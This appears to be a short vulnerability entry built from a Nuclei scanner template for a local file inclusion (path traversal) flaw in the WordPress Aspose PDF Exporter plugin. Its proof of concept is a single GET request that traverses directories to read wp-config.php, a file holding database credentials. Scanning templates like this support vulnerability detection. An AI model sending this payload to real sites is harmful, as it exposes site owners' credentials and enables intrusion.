# Nuclei Template: WordPress Aspose PDF Exporter - Local File Inclusion
**Template ID:** aspose-pdf-file-download
**Vulnerability Class:** Relative Path Traversal
**Severity:** High
**CWE:** CWE-23
**Source:** Nuclei Template (`aspose-pdf-file-download.yaml`)

## Vulnerability Information & PoC

## Description
WordPress Aspose PDF Exporter is vulnerable to local file inclusion.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/wp-content/plugins/Wordpress/Aaspose-pdf-exporter/aspose_pdf_exporter_download.php?file=../../../wp-config.php
```

## References
- https://packetstormsecurity.com/files/131161
- https://wordpress.org/plugins/aspose-pdf-exporter
